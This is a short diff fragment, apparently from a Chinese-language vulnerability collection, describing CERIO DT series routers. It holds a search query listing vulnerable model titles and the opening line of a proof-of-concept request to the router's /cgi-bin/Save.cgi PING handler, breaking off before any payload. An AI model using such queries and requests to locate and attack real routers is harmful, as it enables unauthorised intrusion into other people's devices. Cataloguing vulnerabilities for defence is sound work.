@@ -7,7 +7,7 @@ CERIO DT系列路由器是中国台湾智鼎资讯（CERIO）公司的一款无�
 title="DT-100G-N" || title="DT-300N" || title="DT-100G" || title="AMR-3204G" || title="WMR-200N"
 ```
 
-## poc
+## POC
 ```
 POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1
 Host: 
